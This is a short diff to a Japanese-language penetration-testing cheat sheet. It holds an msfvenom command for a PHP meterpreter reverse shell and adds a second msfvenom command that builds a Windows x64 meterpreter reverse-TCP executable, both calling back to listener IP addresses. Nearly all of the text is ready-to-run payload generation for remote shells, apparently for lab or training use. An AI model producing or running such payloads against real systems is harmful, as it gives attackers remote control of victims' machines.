@@ -34,3 +34,8 @@ phpのリバースシェルを生成する
 ```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.157 LPORT=4444 -f raw > shell.php
 ```
+
+1. windows用のリバースシェルバイナリを生成する。
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
+```
